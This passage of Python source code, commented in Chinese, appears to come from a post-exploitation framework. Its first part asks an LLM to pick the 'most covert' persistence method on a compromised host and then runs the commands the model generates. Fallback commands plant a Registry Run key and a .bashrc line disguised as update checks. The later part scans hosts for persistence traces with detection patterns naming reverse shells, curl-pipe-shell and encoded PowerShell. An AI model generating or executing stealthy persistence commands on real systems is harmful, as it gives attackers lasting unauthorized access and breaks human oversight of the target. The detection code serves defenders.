                status=OperationStatus.FAILED,
                message="AI未能生成有效的持久化命令",
                data={"ai_response": ai_decision},
                next_steps=["检查环境信息", "尝试手动持久化"]
            )

        # Step 3: 执行AI建议的命令
        results = []
        for cmd in ai_decision["commands"]:
            result = PrivilegeEscalation._execute_command(session, cmd)
            results.append({
                "command": cmd,
                "success": result.get("success", False),
                "output": result.get("output", "")[:200]
            })

        # Step 4: 验证持久化有效
        successful = [r for r in results if r["success"]]
        if successful:
            return OperationResult(
                status=OperationStatus.SUCCESS,
                message=f"持久化建立成功: {ai_decision.get('method', 'unknown')}",
                data={
                    "method": ai_decision.get("method"),
                    "results": results,
                    "cleanup_commands": ai_decision.get("cleanup_commands", [])
                },
                next_steps=["验证持久化", "继续操作"],
                rollback_cmd=ai_decision.get("cleanup_commands", [None])[0]
            )

        return OperationResult(
            status=OperationStatus.FAILED,
            message="所有持久化命令执行失败",
            data={"attempts": results, "ai_decision": ai_decision},
            next_steps=["检查权限", "尝试其他方法"]
        )

    @classmethod
    def _collect_env_info(cls, session: Dict) -> Dict:
        """收集环境信息供AI分析"""
        os_type = session.get("os_type", "linux").lower()

        # 执行环境探测命令
        if os_type == "windows":
            commands = {
                "whoami": "whoami",
                "privileges": "whoami /priv 2>&1",
                "admin_check": "net session 2>&1 || echo NOT_ADMIN"
            }
        else:
            commands = {
                "whoami": "id",
                "crontab": "crontab -l 2>&1 || echo NO_CRONTAB",
                "writable_dirs": "ls -la /tmp ~/. 2>/dev/null | head -10"
            }

        results = {}
        for name, cmd in commands.items():
            result = PrivilegeEscalation._execute_command(session, cmd)
            results[name] = result.get("output", "")[:500]

        return results

    @classmethod
    def _ai_decide_persistence(cls, os_type: str, env_info: Dict) -> Dict:
        """
        AI决策持久化策略

        让AI根据环境信息自主选择最佳方法
        """
        try:
            from llm_client import llm_client
            from config import config

            prompt = f"""你是渗透测试专家。根据目标环境，选择最佳的持久化方法并生成命令。

目标系统: {os_type}
环境信息:
{json.dumps(env_info, ensure_ascii=False, indent=2)}

要求:
1. 选择最隐蔽且可行的持久化方法
2. 生成具体的执行命令
3. 同时生成清理命令

输出JSON格式:
{{
    "method": "方法名称",
    "reason": "选择理由",
    "commands": ["要执行的命令列表"],
    "cleanup_commands": ["清理命令列表"],
    "stealth_level": 1-5
}}

{"Windows常见方法: 计划任务、注册表Run、服务、WMI事件" if os_type == "windows" else "Linux常见方法: crontab、systemd、bashrc、SSH密钥"}

选择权限允许的最隐蔽方法。"""

            response = llm_client.call_chat_completion(
                model=config.HAIKU_MODEL,
                messages=[{"role": "user", "content": prompt}],
                json_mode=True,
                timeout=30
            )

            if response:
                return json.loads(response)

        except Exception as e:
            pass

        # 降级策略：简单的默认命令
        if os_type == "windows":
            return {
                "method": "registry_run",
                "reason": "fallback: 最低权限要求",
                "commands": ['reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "UpdateService" /t REG_SZ /d "cmd /c whoami" /f'],
                "cleanup_commands": ['reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "UpdateService" /f']
            }
        else:
            return {
                "method": "bashrc",
                "reason": "fallback: 用户级持久化",
                "commands": ["echo '# Update check\\nwhoami' >> ~/.bashrc"],
                "cleanup_commands": ["sed -i '/Update check/d' ~/.bashrc"]
            }

    @classmethod
    def verify_persistence(cls, session: Dict, method: str = None,
                           persistence_data: Dict = None) -> bool:
        """
        验证持久化是否有效 - AI驱动，支持多种方法
        """
        if method:
            verify_cmd = cls._get_verify_command(method)
            if verify_cmd:
                result = PrivilegeEscalation._execute_command(session, verify_cmd)
                return result.get("success", False)

        # 降级: 检查环境变化
        env_info = cls._collect_env_info(session)
        return len(env_info.get("whoami", "")) > 0

    @staticmethod
    def _get_verify_command(method: str) -> str:
        """获取验证命令 - 支持8种常见方法"""
        verify_map = {
            "registry_run": 'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"',
            "scheduled_task": 'schtasks /query /tn "UpdateService"',
            "service": 'sc query UpdateService',
            "wmi_event": 'wmic eventsubscription list',
            "bashrc": "grep -c 'Update' ~/.bashrc",
            "crontab": "crontab -l | grep -c 'update'",
            "systemd_service": "systemctl is-active update-service",
            "ssh_key": "test -f ~/.ssh/authorized_keys && echo 1"
        }
        return verify_map.get(method, "")

    @classmethod
    def rollback_persistence(cls, session: Dict, persistence_data: Dict) -> OperationResult:
        """
        回滚/清理持久化
        """
        cleanup_commands = persistence_data.get("cleanup_commands", [])

        if not cleanup_commands:
            return OperationResult(
                status=OperationStatus.FAILED,
                message="无清理命令可用",
                data={},
                next_steps=[]
            )

        results = []
        for cmd in cleanup_commands:
            result = PrivilegeEscalation._execute_command(session, cmd)
            results.append({"command": cmd, "success": result.get("success", False)})

        successful = [r for r in results if r["success"]]
        return OperationResult(
            status=OperationStatus.SUCCESS if successful else OperationStatus.PARTIAL,
            message=f"清理完成: {len(successful)}/{len(results)} 成功",
            data={"results": results},
            next_steps=[]
        )


def detect_persistence_traces(session: Dict) -> Dict:
    """
    检测持久化痕迹

    检查项目：
    1. Windows: 计划任务、注册表启动项、服务、WMI订阅
    2. Linux: crontab、systemd服务、ssh密钥、.bashrc

    Args:
        session: 会话信息字典，包含os_type等

    Returns:
        Dict: 包含traces列表、count数量、scan_time扫描时间
    """
    os_type = session.get("os_type", "windows").lower()
    results = []

    if os_type == "windows":
        # 检查计划任务
        results.extend(_check_scheduled_tasks(session))
        # 检查注册表启动项
        results.extend(_check_registry_run(session))
        # 检查服务
        results.extend(_check_services(session))
    else:
        # 检查crontab
        results.extend(_check_crontab(session))
        # 检查systemd服务
        results.extend(_check_systemd_services(session))
        # 检查SSH密钥
        results.extend(_check_ssh_keys(session))

    return {
        "traces": results,
        "count": len(results),
        "scan_time": time.time()
    }


def _check_scheduled_tasks(session: Dict) -> List[Dict]:
    """
    检查Windows计划任务

    查找可疑的计划任务，包括：
    - 以SYSTEM权限运行的任务
    - 启动时执行的任务
    - 异常名称的任务
    """
    results = []
    cmd = "schtasks /query /fo LIST /v"

    result = PrivilegeEscalation._execute_command(session, cmd)
    output = result.get("output", "")

    if not output or result.get("success") is False:
        return results

    # 解析计划任务输出
    tasks = []
    current_task = {}

    for line in output.split("\n"):
        line = line.strip()
        if line.startswith("TaskName:"):
            if current_task:
                tasks.append(current_task)
            current_task = {"name": line.split(":", 1)[1].strip()}
        elif line.startswith("Task To Run:"):
            current_task["command"] = line.split(":", 1)[1].strip()
        elif line.startswith("Run As User:"):
            current_task["run_as"] = line.split(":", 1)[1].strip()
        elif line.startswith("Next Run Time:"):
            current_task["next_run"] = line.split(":", 1)[1].strip()

    if current_task:
        tasks.append(current_task)

    # 识别可疑任务
    suspicious_patterns = [
        r"cmd\.exe", r"powershell\.exe", r"wscript\.exe", r"cscript\.exe",
        r"mshta\.exe", r"regsvr32\.exe", r"rundll32\.exe",
        r"http://", r"https://", r"\\\\",  # 网络路径
        r"base64", r"-enc", r"-encodedcommand",
        r"S-1-5-18", r"SYSTEM", r"NT AUTHORITY"
    ]

    for task in tasks:
        command = task.get("command", "").lower()
        run_as = task.get("run_as", "").upper()

        is_suspicious = False
        matched_patterns = []

        for pattern in suspicious_patterns:
            if re.search(pattern, command, re.IGNORECASE) or re.search(pattern, run_as, re.IGNORECASE):
                is_suspicious = True
                matched_patterns.append(pattern)

        if is_suspicious:
            results.append({
                "type": "scheduled_task",
                "name": task.get("name", "Unknown"),
                "command": task.get("command", ""),
                "run_as": task.get("run_as", ""),
                "next_run": task.get("next_run", ""),
                "suspicious": True,
                "matched_patterns": matched_patterns,
                "severity": "high" if "SYSTEM" in run_as or "S-1-5-18" in run_as else "medium"
            })

    return results


def _check_registry_run(session: Dict) -> List[Dict]:
    """
    检查注册表启动项

    检查常见的自启动注册表位置：
    - HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
    - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
    - HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce
    - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce
    - Winlogon Shell/Userinit
    """
    results = []

    # 常见自启动注册表位置
    run_keys = [
        "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SharedTaskScheduler",
        "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellExecuteHooks",
    ]

    # Winlogon相关
    winlogon_keys = [
        "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell",
        "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit",
        "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Taskman",
    ]

    all_keys = run_keys + winlogon_keys

    # 可疑命令模式
    suspicious_patterns = [
        r"cmd\.exe", r"powershell\.exe", r"wscript\.exe", r"cscript\.exe",
        r"mshta\.exe", r"regsvr32\.exe", r"rundll32\.exe",
        r"http://", r"https://",
        r"base64", r"-enc", r"-encodedcommand",
        r"\\\\", r"C:\\\\Users\\\\Public",
        r"AppData\\\\Local\\\\Temp", r"AppData\\\\Roaming"
    ]

    for key in all_keys:
        cmd = f'reg query "{key}" 2>nul'
        result = PrivilegeEscalation._execute_command(session, cmd)
        output = result.get("output", "")

        if not output:
            continue

        # 解析注册表值
        for line in output.split("\n"):
            line = line.strip()
            if not line or line.startswith("!") or "HKEY_" in line.upper():
                continue

            # 解析格式: 值名 类型 数据
            parts = line.split(None, 2)
            if len(parts) >= 3:
                value_name = parts[0]
                value_data = parts[2] if len(parts) > 2 else ""

                # 检查是否可疑
                is_suspicious = False
                matched_patterns = []

                for pattern in suspicious_patterns:
                    if re.search(pattern, value_data, re.IGNORECASE):
                        is_suspicious = True
                        matched_patterns.append(pattern)

                if is_suspicious:
                    results.append({
                        "type": "registry_run",
                        "key": key,
                        "value_name": value_name,
                        "value_data": value_data,
                        "suspicious": True,
                        "matched_patterns": matched_patterns,
                        "severity": "high" if "HKLM" in key.upper() else "medium"
                    })

    return results


def _check_services(session: Dict) -> List[Dict]:
    """
    检查Windows服务

    查找可疑服务：
    - 隐藏或伪装的服务
    - 异常路径的服务
    - 以SYSTEM权限运行的异常服务
    """
    results = []
    cmd = "wmic service get name,pathname,startmode,startname 2>nul"

    result = PrivilegeEscalation._execute_command(session, cmd)
    output = result.get("output", "")

    if not output:
        # 备用命令
        cmd = "sc query type= service state= all"
        result = PrivilegeEscalation._execute_command(session, cmd)
        output = result.get("output", "")

    if not output:
        return results

    # 可疑路径模式
    suspicious_path_patterns = [
        r"C:\\\\Users\\\\Public",
        r"C:\\\\Temp",
        r"C:\\\\Windows\\\\Temp",
        r"AppData\\\\Local\\\\Temp",
        r"AppData\\\\Roaming",
        r"\\\\\\\\",  # UNC路径
        r"http://", r"https://",
        r"cmd\.exe", r"powershell\.exe",
        r"mshta\.exe", r"regsvr32\.exe", r"rundll32\.exe"
    ]

    # 解析服务信息
    services = []
    current_service = {}

    for line in output.split("\n"):
        line = line.strip()
        if not line:
            continue

        # WMIC格式解析
        if "  " in line and len(line.split()) >= 3:
            parts = line.split()
            if len(parts) >= 3:
                service = {
                    "name": parts[0],
                    "pathname": " ".join(parts[1:-1]) if len(parts) > 2 else "",
                    "startname": parts[-1] if len(parts) >= 3 else ""
                }
                services.append(service)

    # 检查可疑服务
    for service in services:
        pathname = service.get("pathname", "").lower()
        startname = service.get("startname", "").upper()

        is_suspicious = False
        matched_patterns = []

        for pattern in suspicious_path_patterns:
            if re.search(pattern, pathname, re.IGNORECASE):
                is_suspicious = True
                matched_patterns.append(pattern)

        # 检查以SYSTEM运行的可疑服务
        if "LOCALSYSTEM" in startname or "NT AUTHORITY" in startname:
            if any(p in pathname for p in ["temp", "public", "appdata", "users"]):
                is_suspicious = True
                matched_patterns.append("SYSTEM_with_suspicious_path")

        if is_suspicious:
            results.append({
                "type": "service",
                "name": service.get("name", ""),
                "pathname": service.get("pathname", ""),
                "startname": service.get("startname", ""),
                "suspicious": True,
                "matched_patterns": matched_patterns,
                "severity": "high" if "LOCALSYSTEM" in startname else "medium"
            })

    return results


def _check_crontab(session: Dict) -> List[Dict]:
    """
    检查Linux crontab

    检查：
    - /etc/crontab
    - /etc/cron.d/
    - /etc/cron.daily/, /etc/cron.hourly/, etc.
    - 用户crontab
    """
    results = []

    # 检查系统crontab
    system_cron_paths = [
        "/etc/crontab",
        "/etc/cron.d/",
        "/etc/cron.daily/",
        "/etc/cron.hourly/",
        "/etc/cron.weekly/",
        "/etc/cron.monthly/"
    ]

    # 可疑命令模式
    suspicious_patterns = [
        r"curl.*\|.*sh", r"wget.*\|.*sh",
        r"bash\s+-i", r"nc\s+-", r"ncat\s+-",
        r"/dev/tcp/", r"/dev/udp/",
        r"python.*-c.*import",
        r"perl.*-e",
        r"base64.*-d",
        r"http://", r"https://",
        r"\*/\*\s+\*\s+\*\s+\*\s+\*",  # 每分钟执行
    ]

    # 检查系统crontab
    cmd = "cat /etc/crontab 2>/dev/null; for f in /etc/cron.d/*; do echo \"=== $f ===\"; cat \"$f\" 2>/dev/null; done"
    result = PrivilegeEscalation._execute_command(session, cmd)
    output = result.get("output", "")

    if output:
        for line in output.split("\n"):
            line = line.strip()
            if not line or line.startswith("#") or line.startswith("==="):
                continue

            is_suspicious = False
            matched_patterns = []

            for pattern in suspicious_patterns:
                if re.search(pattern, line, re.IGNORECASE):
                    is_suspicious = True
                    matched_patterns.append(pattern)

            if is_suspicious:
                results.append({
                    "type": "crontab",
                    "source": "system_crontab",
                    "line": line,
                    "suspicious": True,
                    "matched_patterns": matched_patterns,
                    "severity": "high"
                })

    # 检查用户crontab
    cmd = "crontab -l 2>/dev/null"
    result = PrivilegeEscalation._execute_command(session, cmd)
    output = result.get("output", "")

    if output and "no crontab" not in output.lower():
        for line in output.split("\n"):
            line = line.strip()
            if not line or line.startswith("#"):
                continue

            is_suspicious = False
            matched_patterns = []

            for pattern in suspicious_patterns:
                if re.search(pattern, line, re.IGNORECASE):
                    is_suspicious = True
                    matched_patterns.append(pattern)

            if is_suspicious:
                results.append({
                    "type": "crontab",
                    "source": "user_crontab",
                    "line": line,
                    "suspicious": True,
                    "matched_patterns": matched_patterns,
                    "severity": "medium"
                })

    # 检查所有用户的crontab
    cmd = "ls /var/spool/cron/crontabs/ 2>/dev/null"
    result = PrivilegeEscalation._execute_command(session, cmd)
    output = result.get("output", "")

    if output:
        for user in output.split():
            user = user.strip()
            if user:
                cmd = f"cat /var/spool/cron/crontabs/{user} 2>/dev/null"
                result = PrivilegeEscalation._execute_command(session, cmd)
                user_cron = result.get("output", "")

                if user_cron:
                    for line in user_cron.split("\n"):
                        line = line.strip()
                        if not line or line.startswith("#"):
                            continue

                        is_suspicious = False
                        matched_patterns = []

                        for pattern in suspicious_patterns:
                            if re.search(pattern, line, re.IGNORECASE):
                                is_suspicious = True
                                matched_patterns.append(pattern)

                        if is_suspicious:
                            results.append({
                                "type": "crontab",
                                "source": f"user_{user}",
                                "line": line,
                                "suspicious": True,
                                "matched_patterns": matched_patterns,
                                "severity": "medium"
                            })

    return results


def _check_systemd_services(session: Dict) -> List[Dict]:
    """
    检查systemd服务

    检查：
    - 自定义systemd服务
    - 异常服务文件路径
    - 可疑服务配置
    """
    results = []

    # 可疑路径模式
    suspicious_path_patterns = [
        r"/tmp/", r"/var/tmp/",
        r"/home/",
        r"http://", r"https://",
        r"curl", r"wget",
        r"bash.*-c", r"python.*-c",
        r"nc\s", r"ncat\s",
        r"/dev/tcp/"
    ]

    # 检查运行中的可疑服务
    cmd = "systemctl list-units --type=service --state=running --no-pager 2>/dev/null"
    result = PrivilegeEscalation._execute_command(session, cmd)
    output = result.get("output", "")

    running_services = []
    if output:
        for line in output.split("\n"):
            if ".service" in line:
                parts = line.split()
                for part in parts:
                    if part.endswith(".service"):
                        running_services.append(part)
                        break

    # 检查服务文件
    service_paths = [
        "/etc/systemd/system/",
        "/lib/systemd/system/",
        "/usr/lib/systemd/system/"
    ]

    for path in service_paths:
        cmd = f"ls -la {path}*.service 2>/dev/null"
        result = PrivilegeEscalation._execute_command(session, cmd)
        output = result.get("output", "")

        if not output:
            continue

        for line in output.split("\n"):
            if ".service" in line:
                parts = line.split()
                if len(parts) >= 9:
                    service_file = parts[-1]

                    # 读取服务内容
                    cmd = f"cat {service_file} 2>/dev/null"
                    result = PrivilegeEscalation._execute_command(session, cmd)
                    service_content = result.get("output", "")

                    if not service_content:
                        continue

                    is_suspicious = False
                    matched_patterns = []
                    exec_start = ""

                    for content_line in service_content.split("\n"):
                        if "ExecStart=" in content_line:
                            exec_start = content_line.split("ExecStart=")[1].strip() if "ExecStart=" in content_line else ""

                            for pattern in suspicious_path_patterns:
                                if re.search(pattern, exec_start, re.IGNORECASE):
                                    is_suspicious = True
                                    matched_patterns.append(pattern)

                    if is_suspicious:
                        results.append({
                            "type": "systemd_service",
                            "service_file": service_file,
                            "exec_start": exec_start,
                            "running": any(os.path.basename(service_file) in s for s in running_services),
                            "suspicious": True,
                            "matched_patterns": matched_patterns,
                            "severity": "high"
                        })

    # 检查用户级systemd服务
    cmd = "ls -la ~/.config/systemd/user/*.service 2>/dev/null"
    result = PrivilegeEscalation._execute_command(session, cmd)
    output = result.get("output", "")

    if output:
        for line in output.split("\n"):
            if ".service" in line:
                parts = line.split()
                if len(parts) >= 9:
                    service_file = parts[-1]

                    cmd = f"cat {service_file} 2>/dev/null"
                    result = PrivilegeEscalation._execute_command(session, cmd)
                    service_content = result.get("output", "")

                    if service_content:
                        is_suspicious = False
                        matched_patterns = []
                        exec_start = ""

                        for content_line in service_content.split("\n"):
                            if "ExecStart=" in content_line:
                                exec_start = content_line.split("ExecStart=")[1].strip() if "ExecStart=" in content_line else ""

                                for pattern in suspicious_path_patterns:
                                    if re.search(pattern, exec_start, re.IGNORECASE):
                                        is_suspicious = True
                                        matched_patterns.append(pattern)

                        if is_suspicious:
                            results.append({
                                "type": "systemd_service",
                                "service_file": service_file,
                                "exec_start": exec_start,
                                "running": False,
                                "user_level": True,
                                "suspicious": True,
                                "matched_patterns": matched_patterns,
                                "severity": "medium"
                            })

    return results


def _check_ssh_keys(session: Dict) -> List[Dict]:
    """
    检查SSH密钥

    检查：
    - authorized_keys中的可疑公钥
    - 新添加的密钥
    - 异常权限
    """
    results = []

    # 检查当前用户的authorized_keys
    cmd = "cat ~/.ssh/authorized_keys 2>/dev/null"
    result = PrivilegeEscalation._execute_command(session, cmd)
    output = result.get("output", "")

    if output:
        for line in output.split("\n"):
            line = line.strip()
            if not line or line.startswith("#"):
                continue

            # 解析authorized_keys行
            parts = line.split()
            if len(parts) >= 2:
                key_type = parts[0]
                key_data = parts[1]
                comment = " ".join(parts[2:]) if len(parts) > 2 else ""

                # 检查可疑注释或来源
                suspicious_comments = ["attack", "malware", "backdoor", "pentest"]

                is_suspicious = False
                for sus in suspicious_comments:
                    if sus in comment.lower():
                        is_suspicious = True
                        break

                results.append({
                    "type": "ssh_key",
                    "source": "authorized_keys",
                    "key_type": key_type,
                    "key_fingerprint": key_data[:32] + "..." if len(key_data) > 32 else key_data,
                    "comment": comment,
                    "suspicious": is_suspicious,
                    "severity": "high" if is_suspicious else "info"
                })

    # 检查文件权限（应该为600）
    cmd = "stat -c '%a %n' ~/.ssh/authorized_keys 2>/dev/null"
    result = PrivilegeEscalation._execute_command(session, cmd)
    output = result.get("output", "")

    if output:
        parts = output.strip().split()
        if len(parts) >= 2:
            perms = parts[0]
            file_path = parts[1]

            # 检查权限是否过于宽松
            if perms and perms != "600" and perms != "400":
                results.append({
                    "type": "ssh_key_permission",
                    "file": file_path,
                    "permissions": perms,
                    "suspicious": True,
                    "severity": "medium",
                    "note": "SSH authorized_keys权限过于宽松"
                })

    # 检查.ssh目录权限
    cmd = "stat -c '%a %n' ~/.ssh 2>/dev/null"
    result = PrivilegeEscalation._execute_command(session, cmd)
    output = result.get("output", "")

    if output:
        parts = output.strip().split()
        if len(parts) >= 2:
            perms = parts[0]
            file_path = parts[1]

            if perms and perms != "700":
                results.append({
                    "type": "ssh_dir_permission",
                    "file": file_path,
                    "permissions": perms,
                    "suspicious": True,
                    "severity": "medium",
                    "note": "SSH目录权限过于宽松"
                })

    # 检查所有用户的authorized_keys（需要root权限）
    cmd = "cat /etc/passwd | grep -v nologin | cut -d: -f6 2>/dev/null"
    result = PrivilegeEscalation._execute_command(session, cmd)
    output = result.get("output", "")

    if output:
        for home_dir in output.split("\n"):
            home_dir = home_dir.strip()
            if home_dir and home_dir != "/":
                cmd = f"cat {home_dir}/.ssh/authorized_keys 2>/dev/null"
                result = PrivilegeEscalation._execute_command(session, cmd)
                user_keys = result.get("output", "")

                if user_keys:
                    for line in user_keys.split("\n"):
                        line = line.strip()
                        if not line or line.startswith("#"):
                            continue

                        parts = line.split()
                        if len(parts) >= 2:
                            key_type = parts[0]
                            comment = " ".join(parts[2:]) if len(parts) > 2 else ""

                            suspicious_comments = ["attack", "malware", "backdoor", "pentest"]
                            is_suspicious = any(sus in comment.lower() for sus in suspicious_comments)

                            if is_suspicious:
                                results.append({
                                    "type": "ssh_key",
                                    "source": f"{home_dir}/.ssh/authorized_keys",
                                    "key_type": key_type,
                                    "comment": comment,
                                    "suspicious": True,
                                    "severity": "high"
                                })

    return results


def verify_persistence(session: Dict, persistence_type: str) -> Dict:
    """
    验证持久化是否生效

    Args:
        session: 会话信息字典
        persistence_type: 持久化类型
            - "scheduled_task": Windows计划任务
            - "registry": Windows注册表启动项
            - "service": Windows服务
            - "wmi": WMI事件订阅
            - "crontab": Linux crontab
            - "systemd": Linux systemd服务
            - "ssh_key": SSH密钥
            - "bashrc": .bashrc后门

    Returns:
        Dict: 包含status(状态)、exists(是否存在)、details(详情)
    """
    os_type = session.get("os_type", "windows").lower()
    result = {
        "persistence_type": persistence_type,
        "exists": False,
        "status": "unknown",
        "details": {}
    }

    if persistence_type == "scheduled_task":
        # 验证计划任务
        cmd = 'schtasks /query /fo LIST /v 2>nul'
        exec_result = PrivilegeEscalation._execute_command(session, cmd)
        output = exec_result.get("output", "")

        if output and "TaskName:" in output:
            result["exists"] = True
            result["status"] = "active"
            result["details"]["task_count"] = output.count("TaskName:")

    elif persistence_type == "registry":
        # 验证注册表启动项
        keys_to_check = [
            "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        ]

        found_entries = []
        for key in keys_to_check:
            cmd = f'reg query "{key}" 2>nul'
            exec_result = PrivilegeEscalation._execute_command(session, cmd)
            output = exec_result.get("output", "")

            if output and len(output.strip()) > 0:
                found_entries.append({"key": key, "entries": output.strip()})

        if found_entries:
            result["exists"] = True
            result["status"] = "active"
            result["details"]["entries"] = found_entries

    elif persistence_type == "service":
        # 验证Windows服务
        cmd = "sc query type= service state= all 2>nul"
        exec_result = PrivilegeEscalation._execute_command(session, cmd)
        output = exec_result.get("output", "")

        if output:
            service_count = output.lower().count("service_name")
            result["exists"] = service_count > 0
            result["status"] = "active"
            result["details"]["service_count"] = service_count

    elif persistence_type == "wmi":
        # 验证WMI事件订阅
        cmd = "wmic eventsubscription list 2>nul"
        exec_result = PrivilegeEscalation._execute_command(session, cmd)
        output = exec_result.get("output", "")

        if output and len(output.strip()) > 0:
            result["exists"] = True
            result["status"] = "active"
            result["details"]["subscriptions"] = output.strip()

    elif persistence_type == "crontab":
        # 验证crontab
        cmd = "crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null"
        exec_result = PrivilegeEscalation._execute_command(session, cmd)
        output = exec_result.get("output", "")

        if output and "no crontab" not in output.lower():
            result["exists"] = True
            result["status"] = "active"
            result["details"]["crontab_entries"] = output.strip()

    elif persistence_type == "systemd":
        # 验证systemd服务
        cmd = "systemctl list-unit-files --type=service --state=enabled --no-pager 2>/dev/null"
        exec_result = PrivilegeEscalation._execute_command(session, cmd)
        output = exec_result.get("output", "")

        if output:
            enabled_services = []
            for line in output.split("\n"):
                if ".service" in line and "enabled" in line:
                    enabled_services.append(line.strip())

            if enabled_services:
                result["exists"] = True
                result["status"] = "active"
                result["details"]["enabled_services"] = enabled_services

    elif persistence_type == "ssh_key":
        # 验证SSH密钥
        cmd = "cat ~/.ssh/authorized_keys 2>/dev/null"
        exec_result = PrivilegeEscalation._execute_command(session, cmd)
        output = exec_result.get("output", "")

        if output and len(output.strip()) > 0:
            key_count = len([l for l in output.split("\n") if l.strip() and not l.startswith("#")])
            result["exists"] = key_count > 0
            result["status"] = "active"
            result["details"]["key_count"] = key_count

    elif persistence_type == "bashrc":
        # 验证.bashrc后门
        cmd = "cat ~/.bashrc 2>/dev/null"
        exec_result = PrivilegeEscalation._execute_command(session, cmd)
        output = exec_result.get("output", "")

        if output:
            suspicious_lines = []
            suspicious_patterns = [
                r"curl.*\|.*sh", r"wget.*\|.*sh",
                r"bash\s+-i", r"nc\s+-",
                r"/dev/tcp/", r"base64",
                r"http://", r"https://"
            ]

            for line in output.split("\n"):
                for pattern in suspicious_patterns:
                    if re.search(pattern, line, re.IGNORECASE):
                        suspicious_lines.append(line.strip())
                        break

            if suspicious_lines:
                result["exists"] = True
                result["status"] = "active"
                result["details"]["suspicious_lines"] = suspicious_lines

    else:
        result["status"] = "unsupported_type"
        result["details"]["error"] = f"Unknown persistence type: {persistence_type}"

    return result